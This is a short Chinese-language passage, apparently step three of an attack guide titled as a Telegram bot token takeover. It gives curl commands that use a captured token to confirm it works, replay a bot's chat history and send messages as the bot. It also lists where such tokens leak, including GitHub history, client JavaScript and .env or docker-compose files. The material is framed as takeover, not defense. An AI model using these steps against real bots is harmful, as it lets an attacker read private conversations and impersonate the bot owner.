## 第 3 步: Bot Token 接管(拿到 token = 全接管)

```
curl https://api.telegram.org/bot<TOKEN>/getMe          # 验证
curl https://api.telegram.org/bot<TOKEN>/getUpdates?offset=-1000   # 回放聊天记录
curl -X POST https://api.telegram.org/bot<TOKEN>/sendMessage -d chat_id=<ID> -d text="..."
Token 泄露途径: GitHub 仓库/历史提交、客户端 JS、.env/docker-compose
```

